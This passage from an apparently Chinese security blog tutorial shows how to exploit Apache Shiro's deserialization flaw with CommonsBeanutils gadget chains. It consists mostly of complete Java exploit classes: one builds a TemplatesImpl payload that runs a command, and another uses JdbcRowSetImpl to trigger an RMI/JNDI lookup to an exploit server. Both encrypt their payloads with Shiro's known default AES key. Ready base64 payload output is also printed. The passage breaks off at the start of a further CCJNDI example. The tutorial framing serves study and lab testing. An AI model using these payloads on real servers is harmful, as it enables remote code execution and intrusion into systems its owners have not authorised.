class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.time.temporal.Temporal;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvil() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(cmd);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;getEvil()&#125;);<br>        setField(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,<span class="hljs-string">&quot;lingx5&quot;</span>&#125;);<br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化CB链</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CBbytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE,key,ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptBytes = cipher.doFinal(CBbytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CB链</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + encryptBytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(encryptBytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, encryptBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilBase64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(evilBase64);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * AES解密，模拟shiro反序列化</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">byte</span>[] decode = Base64.decode(evilBase64);<br>        <span class="hljs-type">byte</span>[] deIV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[]  deEvilBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decode.length - deIV.length];<br>        System.arraycopy(decode,<span class="hljs-number">0</span>,deIV,<span class="hljs-number">0</span>,deIV.length);<br>        System.arraycopy(decode,deIV.length,deEvilBytes,<span class="hljs-number">0</span>,deEvilBytes.length);<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIV);<br>        cipher.init(Cipher.DECRYPT_MODE,key,deIvSpec);<br>        <span class="hljs-type">byte</span>[] deEvil = cipher.doFinal(deEvilBytes);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvil);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9L3y5N8MW8iFfeSugI+i7ayGvI5zma4flvI0+Ohs0e75iasXZ3R32UCQwCKgUnh0mU63auBEG0Cp2Ej402UIE3o7aDh4sYQ9eOPeErUZhxgVXPEwS0jSobopf1XLG+U84xHW<span class="hljs-regexp">/PZwmedp9fFUKZb43tRoIYEJbLbaoZ+6IPdiljQxyNIt1UKp9kTUdIRMfZbQ+XP0om/</span>c4zO5gSMZGC5zkML5L8xyfEb8FRoTUVzIEu6OkWTfuTZNE2Iu6josCSaJfWqgeU+lSWLUO<span class="hljs-regexp">/U2h7+ysKZzIiT0OGvHNJPQuTbNtD4UNcqVnWslexMivy4j3jna/</span>qJWiyL825Iup4xj+IUguTPEbANdN<span class="hljs-regexp">/QjG9kvMPF1H47HoRw8I77cM575xF8KiYJXqfOTMdfkCKBi79iLrHTuwwRwWav1WhXmKs8nwCL1w2R9qoaXvaDMDNGQKpO0XHGsEeLOI9I1tg9RHatCYclF0DMVqLGInN5ZBq8Rd7G+L5f72ijtdSOZfSAM4VPpUFEUZhhauKNW5DTqYDKfrJHQvWJawoXKp0vK0xQoTr45TcgMv6ChEUTb7f+K0Ehb9G0XYVFIhJhgqQD8O+fD4mHt2ae4Hzi+9Y+GZmSdLyq8iM3l0+j9Tvt/</span><span class="hljs-regexp">/5CZSov9wE7BZmTY7YLgMP8dzNJfE5H42E+/</span>Fh89GUOYW7EHTF+<span class="hljs-number">6</span>ywmGfavFiO83Cm2LFGfyyiAW5VFZnEaafRiJWRmf+ig62Oxt+<span class="hljs-number">6</span>j5OWe1YiViDwi6Uu9SYd2Ql1zTSqxwvMMUzBVyAafzgY2wsU32qS4P2nietjz7rhtmJh5UsNKDMeLnTjLSPfAYxmp+nyAw13Og5KpRqAimMNueU0gBfVwpkkd7MWSMyMNhuj1AsCcPUdnFQ8HON9w3y3DIbPoaOZxY<span class="hljs-regexp">/j327bnR4TZ2QGwe1D9dlw56wxRTaEpjFKwoLIRfqT53HF3A+O6SYvbw6L5Jsrkea7LFGwdL935eglE+/</span>dlMDz<span class="hljs-regexp">//y</span>OSfiX6jKvme9j3xfhSXeSrjZhGkCOdKea1XQRkm1B+dKx8CmIPY<span class="hljs-regexp">/IoGSTx8ayimutvGC9Kt/</span>rijlE9uMv8K7ftrlPs8w021jPwqgN3LaZnEPAVjBrt1+<span class="hljs-number">8</span>aJod+D1KS4qkmfUXTVt2<span class="hljs-regexp">/gjB+35VOo6+riVz9o3WWhs+/</span>RoZH5DnuQFHPsIMqEnuN3QZI8KNOk<span class="hljs-regexp">/FVyG9cbrBlGf7M0wjMPd9/</span>cU=<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420191944371.png" alt="image-20250420191944371"></p><p>需要注意的是  BeanComparator 这个类的构造方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420192446736.png" alt="image-20250420192446736"></p><p>看到</p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250420192545420.png" alt="image-20250420192545420" style="zoom:50%;" /><p>所以 payload 在初始化的时候，传入的是 AttrCompare</p><blockquote><p>BeanComparator beanComparator &#x3D; new BeanComparator(“outputProperties”, new AttrCompare());</p></blockquote><h3 id="CB、CC-JNDI"><a href="#CB、CC-JNDI" class="headerlink" title="CB、CC-JNDI"></a>CB、CC-JNDI</h3><p>目标可以出网的时候，我们可以利用 JdbcRowSetImpl 这个类进行 JNDI 的一系列攻击，在讨论 <a href="https://www.cnblogs.com/LINGX5/p/18788161#jdbcrowsetimpl">fasjson1.2.24</a> 时，也有用到这个类进行 JNDI 的攻击，在 fastjson 中主要用到的方法是 setAutoCommit 去调用 connect() 方法，触发 JNDI 攻击。</p><p>不熟悉 <a href="https://www.cnblogs.com/LINGX5/p/18772225">JNDI</a> 和 <a href="https://www.cnblogs.com/LINGX5/p/18761103">RMI</a> 的话，可以参考我这两篇文章</p><p>事实上 connect() 方法在 JdbcRowSetImpl 中调用的地方还有很多</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421135933032.png" alt="image-20250421135933032"></p><p>CC 链的 InvokeTransformer 具有反射调用任意方法的能力，而 CB 链的 PropertyUtil 具有调用 getter 方法的能力。这也成为了我们可以利用的点，如果目标采用高版本的 JDK，需要开启 <code>trustCodeBase = true</code> 。</p><blockquote><p>System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);<br>System.setProperty(“com.sun.jndi.ldap.object.trustURLCodebase”, “true”);</p></blockquote><p><strong>我们先来看低版本 jdk7u80 没有做 trustURLCodebase 限制的版本</strong></p><h4 id="CBJNDI"><a href="#CBJNDI" class="headerlink" title="CBJNDI"></a>CBJNDI</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CBJNDI</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">gadGet</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">jdbcRowSet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        jdbcRowSet.setDataSourceName(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Exploit&quot;</span>);<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;databaseMetaData&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, beanComparator);<br>        setField(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        setField(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;jdbcRowSet,<span class="hljs-string">&quot;lingx5&quot;</span>&#125;);<br>        <span class="hljs-keyword">return</span> priorityQueue;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化CB链</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos).writeObject(gadGet());<br>        <span class="hljs-type">byte</span>[] CBbytes = baos.toByteArray();<br>        <span class="hljs-comment">// AES加密</span><br>        <span class="hljs-type">byte</span>[] encryptKey = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br>        <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES/CBC/PKCS5Padding&quot;</span>);<br>        <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(encryptKey, <span class="hljs-string">&quot;AES&quot;</span>);<br>        <span class="hljs-comment">// 创建IV</span><br>        <span class="hljs-type">byte</span>[] IV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">ivSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(IV);<br>        cipher.init(Cipher.ENCRYPT_MODE,key,ivSpec);<br>        <span class="hljs-type">byte</span>[] encryptBytes = cipher.doFinal(CBbytes);<br>        <span class="hljs-comment">// 拼接IV和加密后的CB链</span><br>        <span class="hljs-type">byte</span>[] IVandEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[IV.length + encryptBytes.length];<br>        System.arraycopy(IV, <span class="hljs-number">0</span>, IVandEncrypt, <span class="hljs-number">0</span>, IV.length);<br>        System.arraycopy(encryptBytes, <span class="hljs-number">0</span>, IVandEncrypt, IV.length, encryptBytes.length);<br>        <span class="hljs-comment">// Base64编码</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">evilBase64</span> <span class="hljs-operator">=</span> Base64.encodeToString(IVandEncrypt);<br>        System.out.println(evilBase64);<br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * AES解密，模拟shiro反序列化</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">byte</span>[] decode = Base64.decode(evilBase64);<br>        <span class="hljs-type">byte</span>[] deIV = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        <span class="hljs-type">byte</span>[]  deEvilBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[decode.length - deIV.length];<br>        System.arraycopy(decode,<span class="hljs-number">0</span>,deIV,<span class="hljs-number">0</span>,deIV.length);<br>        System.arraycopy(decode,deIV.length,deEvilBytes,<span class="hljs-number">0</span>,deEvilBytes.length);<br>        <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">deIvSpec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(deIV);<br>        cipher.init(Cipher.DECRYPT_MODE,key,deIvSpec);<br>        <span class="hljs-type">byte</span>[] deEvil = cipher.doFinal(deEvilBytes);<br><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(deEvil);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais).readObject();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">AAAAAAAAAAAAAAAAAAAAAJE6IN+YLEO<span class="hljs-regexp">/t7NuQvYGo54pFMPmAy1jLjUdyV2cc+dKJ0aTntr18Yzsis+1QzDVvl+rnlJLeWPJuL0cSfWAzo+2No6vA3hYfiyY7N7bIdaAAkxZxFdOGUyPMfG4Vp2mmHjn+yS1RXTT9F5R0sGFblDzzZz+nZQsajao/g</span>dRfw9L3y5N8MW8iFfeSugI+i7ayGvI5zma4flvI0+Ohs0e75iasXZ3R32UCQwCKgUnh0mU63auBEG0Cp2Ej402UIE3o7aDh4sYQ9eOPeErUZhxgVXPEwS0jSobopf1XLG+U84xHW<span class="hljs-regexp">/PZwmedp9fFUKZb43tRoIYEJbLbaoZ+6IPdiljQxyNIt1UKp9kTUdIRMfZbQ+XXL96FlqUjDjMpEuQ/</span><span class="hljs-number">04</span>P4sr0Q4TMcO8gKx2MsXdjE1wMXm4xUoNmYCKS+gP40cuQ9ZkjOpWD4xK8PPjHAKi4B<span class="hljs-regexp">/yX23PeseYG4BgEJ7Wxt43UBMuBkK8uAiq8+i9thHK3HOoWQBQcpfbUErwt97Dt2KVRnjfeH/</span>W<span class="hljs-regexp">/H8H9Y80fenJnQ52jn08qvCfWUaogKbIRcWgpkHji3hhSb1/</span>F8TDJIozRzyIRfLZN6S4mONEXOR2CCiPwIRvptY5OvpWmgc0za9EP4ptxlXAZ5tFBnQ4FkQnm0fkW2YjNNvJAdmf8H9VM4vBER6ylig8W53p8E2or<span class="hljs-regexp">/Yo80Iv2OKEZvgMa6mdDp6oNSH02r7SHsgShUY1lvRhOQPnpqQ6bkwgztgzALHnUJE8RToC/</span><span class="hljs-number">41</span>PwfWC8JXLMAxl+NOpQ9JIHg1JRBW2WENaVARKxdPbR3CTUjza63NkOesCYpphTA2EPzWKS0tPUOoguYiwfbfk6sCs+NNP78rtIMxJ7r28fYZrhUsZQ19Yva3hVeW5l2BGx0dX9<span class="hljs-regexp">/+5XpBLKPwPS3bi2mukP/</span><span class="hljs-number">7</span>WlX6PIn0wK5cQbYh7iCAn9RMaFcrMs5MPsa2tA6Emdmsl<span class="hljs-regexp">//</span>ZKLztCYN41cytm8Q5ILppBUexuI+AL7quGOWZ5tnMVd8T5N9UZW6iLbccEzzwK3A2yZXy0Z5C3wSlvur7jdgFgzxAO<span class="hljs-regexp">/frwHyWp2W3YdNVLCNs88mbMVwOtDvHsyrX7i/</span>SYhrSZGwd+<span class="hljs-number">3</span>AjHtmtRq991YbzF5Wr+P2HgMub7nc7DLLgzt7JitTp<span class="hljs-regexp">/OHWUiY3toGXVwtkpzD+3FAi3g3tGzWTvZI9qYaan3d82BVcjVFNEgfg3yF+W4vLnaMczVc3JVyp/</span>zvDWamt3mdHurxE3h1NhhpMCo09IRYIpbFT8PBXDwXdLq9T3EbqWd5dHhq+wWQ0Ns1DPwHMd6dah6d9nXN617atL7mAR9xJPjsQwxb6cAzJD3fEXQ6ESpOIx9oBoePh90QEI<span class="hljs-regexp">/nL4RPIQHigy5Vp1ABykdnzg9MwIEbRzB6yi+a55SYyoSVFwNQ3DsO7TPxL/</span>oW5MNSGvDhgCG8AVRJ6ZbdSWg4lBnfTSWdIwKBIswvTFGKs656nfVwInX4qhrk7KEbSFYu0S4kQwIEHwjpldn4A12pZ1jGjF+<span class="hljs-number">5</span>U2fBYr8usLcorVdJ7o7ZYZ<span class="hljs-regexp">/J0m/i</span>+nan6h1KrPoRIyVHEKZdw3SIA6uWepdsDcHgxIBzelJbSV6d15RPq6qcwpIRaehkepAItfn2wCizCarD0rCuAhTSg3pPmKmlbuO3xwP928lniY66bEdAnhzDH3p4tai8YDYA99uJrirTGuEZoY2g6QsJ2Zdoe6cFwHFTdVLahnhPzspyooI3hXkTlQSj3+RqAxZpECgYMeODY5jrLIwqde+NQfm1BJB3YzMLbcmWXO+F2Ff9p6JUdlXFO3xnrrYxJTqSiFp6HrvD1PAQmbP2bSCJ82LgxbeJwTtRNxzpH9bMYpYLLdSiC1FtRXlLgINI<span class="hljs-regexp">/C0VCzXO3eL8LD0yGE5XFUitd8gE5Nq1XvMiiaY/</span>NqE9f99QSX9kXo9B0JnIgT90z3s2kPTKrhfPz0+lpHzOkPc2Ch2hA5EMcj0MpH0DWZG8ICqHZ3EvcwXU6X2hAlpYH9<span class="hljs-regexp">/86LgXqGLKmnhT614YxXoPMrfiymewHnuZ2dsNLPyp9p/</span>sSQCSMBADfad2FO3Yg==<br></code></pre></td></tr></table></figure><p>开启对应的 RMI 和 http 服务</p><center>    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250421151245612.png" alt="image-20250421151245612" width=450px;" /> <img src="https://gitee.com/ling-x5/img/raw/master/image-20250421151413989.png" alt="image-20250421151413989" width=450px;" /></center><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250421152015972.png" alt="image-20250421152015972"></p><h4 id="CCJNDI"><a href="#CCJNDI" class="headerlink" title="CCJNDI"></a>CCJNDI</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 